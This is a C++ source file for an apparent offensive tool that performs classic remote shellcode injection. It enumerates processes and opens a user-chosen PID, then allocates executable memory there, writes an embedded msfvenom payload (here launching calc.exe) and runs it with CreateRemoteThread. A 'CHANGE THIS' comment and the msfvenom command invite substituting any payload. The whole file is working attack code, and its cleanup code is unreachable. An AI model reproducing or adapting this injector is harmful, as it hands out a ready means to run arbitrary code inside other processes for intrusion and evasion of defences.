#include "injectShellcode.h"

PVOID rBuffer;
HANDLE rThread;
HANDLE hProcess;
DWORD processCounter = 0;
DWORD pLevel = 1; 
PWTS_PROCESS_INFO_EX procInfo = NULL; // WTS_PROCESS_INFO_EX structure (has more flags :3) 

int injectShellcode() {

	// CHANGE THIS
	// msfvenom EXITFUNC=thread -p windows/x64/exec CMD='cmd.exe /c calc.exe' -x x64/shikata_ga_nai -i 3 -f c
	unsigned char buf[] =
		"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
		"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
		"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
		"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
		"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
		"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
		"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
		"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
		"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
		"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
		"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
		"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
		"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
		"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
		"\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
		"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
		"\x6f\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
		"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
		"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
		"\xd5\x63\x6d\x64\x2e\x65\x78\x65\x20\x2f\x63\x20\x63\x61"
		"\x6c\x63\x2e\x65\x78\x65\x00";

	printf("%s loaded Shellcode Injection module!\n", ok);

	if (!WTSEnumerateProcessesEx(
		WTS_CURRENT_SERVER,
		&pLevel,
		WTS_ANY_SESSION,
		(LPTSTR*)&procInfo,
		&processCounter
	)) {

		printf("\n%s something went wrong. you're on your own.", er);
		return EXIT_FAILURE;

	}

	printf("%s press any key to continue", in);
	fflush(stdin); // clear input buffer 
	_getch();
	system("cls");
	printf("%s starting process enumeration...\n", in);

	for (DWORD iterator = 1; iterator <= processCounter; iterator++) {

		printf("\n%s %S [%d]\n", in, procInfo->pProcessName, iterator);
		printf("\n\t%s PID (%d)", ok, procInfo->ProcessId);
		printf("\n\t%s session ID (%d)", ok, procInfo->SessionId);
		printf("\n\t%s process name = %S", ok, procInfo->pProcessName);
		printf("\n\t%s process handle count = %d", ok, procInfo->HandleCount);
		printf("\n\t%s number of threads = %d\n", ok, procInfo->NumberOfThreads);
		procInfo++;
	}

	printf("\n%s processes found: %d", ok, processCounter);

	DWORD PID;
	printf("\n%s select a PID to inject into\n\n>>> ", in);
	std::cin >> PID;
	system("cls");
	printf("\n%s PID selected (%d)", in, PID);

	hProcess = OpenProcess(
		PROCESS_ALL_ACCESS, // (STANDARD_RIGHTS_REQUIRED (0x000F0000L) | SYNCHRONIZE (0x00100000L) | 0xFFFF)
		FALSE,
		PID
	);

	if (hProcess == NULL) {
		printf("\n%s couldn't attach to %i", er, PID);
		return EXIT_FAILURE;
	}

	printf("\n%s attached to process (%d)\n", ok, PID);

	WCHAR procPath[MAX_PATH];
	DWORD procSize = MAX_PATH;

	if (QueryFullProcessImageNameW(
		hProcess,
		0, // DON'T SET THIS TO PROCESS_NAME_NATIVE (0x00000001)
		procPath,
		&procSize)
		) {

		printf("\n\t%s process path = %ls", in, procPath);

		WCHAR* exeName = wcsrchr(procPath, L'\\');
		if (exeName == NULL) {
			printf("\n\t%s unable to extract name from path", er);
			exeName = procPath;
		}

		else {
			exeName++;
		}

		printf("\n\t%s process name = %ls", in, exeName);
	}

	else {
		printf("\n%s something went wrong. you're on your own. good luck.", er);
		exit(1);
	}

	DWORD arch;
	if (!GetBinaryTypeW(procPath, &arch)) {
		printf("\n\t%s failed to get binary arch.", er);
	}

	switch (arch) {

	case SCS_32BIT_BINARY:
		printf("\n\t%s process architecture = 32-bit", in);
		break;

	case SCS_64BIT_BINARY:
		printf("\n\t%s process architecture = 64-bit", in);
		break;

	case SCS_WOW_BINARY:
		printf("\n\t%s process architecture = 16-bit", in);
		break;

	default:
		printf("\n\t%s process architecture = UNKNOWN.", in);
		break;
	}

	DWORD PROCID = GetProcessId(hProcess);
	printf("\n\t%s process_id = %i", in, PROCID);

	DWORD PROCVERSION = GetProcessVersion(PROCID);
	printf("\n\t%s process_version = %lu", in, PROCVERSION);

	printf("\n\t%s size of shellcode: %i\n", in, (unsigned int)sizeof(buf));
	printf("\n%s starting injection...", in);
	printf("\n%s allocating memory...\n\n", in);
	
	rBuffer = VirtualAllocEx(
		hProcess, 
		NULL, 
		sizeof(buf), 
		(MEM_COMMIT | MEM_RESERVE), // 0x00001000 | 0x00002000
		PAGE_EXECUTE_READWRITE // 0x40
	);

	printf("\t%s VirtualAllocEx() [flProtect ---> PAGE_EXECUTE_READWRITE (RWX)]\n", in);
	printf("\t%s VirtualAllocEx() [flAllocationType ---> MEM_COMMIT | MEM_RESERVE]\n", in);
	printf("\n%s allocated memory", ok);

	printf("\n%s writing to process memory...", in);
	WriteProcessMemory(
		hProcess, 
		rBuffer, 
		buf, 
		sizeof(buf), 
		NULL
	);
	printf("\n%s wrote to process memory", ok);

	DWORD sleepTime;

	printf("\n\n%s time to sleep (in seconds)", in);
	printf("\n%s for none/no sleep time, enter in '0' \n\n>>> ", in);
	std::cin >> sleepTime;

	sleepTime *= 1000;

	printf("\n%s creating remote thread...", in);

	if (sleepTime || sleepTime > 0) {

		printf("\n%s sleeping for %ld seconds...", in, (sleepTime / 1000));
		Sleep(sleepTime);

	}

	rThread = CreateRemoteThread(
		hProcess,
		NULL,
		0,
		(LPTHREAD_START_ROUTINE)rBuffer,
		NULL,
		0,
		NULL
	);
	printf("\n%s created remote thread", ok);

	printf("\n%s closing handle to process...", in);
	CloseHandle(hProcess);
	printf("\n%s finished", ok);

	return 0;

	if (!WTSFreeMemoryEx(
		WTSTypeProcessInfoLevel1,
		procInfo,
		processCounter
	)) {
		printf("\n%s something went wrong. couldn't free the memory. you're on your own.", er);
		return EXIT_FAILURE;
	}

	procInfo = NULL;
	return EXIT_SUCCESS;
	
}